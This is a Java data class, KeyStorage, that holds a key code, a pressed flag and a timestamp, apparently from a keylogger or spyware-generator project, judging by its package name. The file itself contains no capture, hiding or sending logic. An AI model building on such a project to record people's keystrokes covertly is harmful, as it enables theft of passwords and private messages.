package com.houarizegai.spygen.keylogger;

public class KeyStorage {
    private int keyCode;
    private boolean pressed;
    private long systemTimePressedMillis;

    public KeyStorage(int keyCode, boolean pressed, long systemTimePressedMillis) {
        this.keyCode = keyCode;
        this.pressed = pressed;
        this.systemTimePressedMillis = systemTimePressedMillis;
    }

    public int getKeyCode() {
        return keyCode;
    }

    public boolean isPressed() {
        return pressed;
    }

    public long getSystemTimePressedMillis() {
        return systemTimePressedMillis;
    }

    @Override
    public String toString() {
        return "KeyStorage{" +
                "keyCode=" + keyCode + ", pressed=" + pressed +
                ", systemTimePressedMillis=" + systemTimePressedMillis + '}';
    }
}
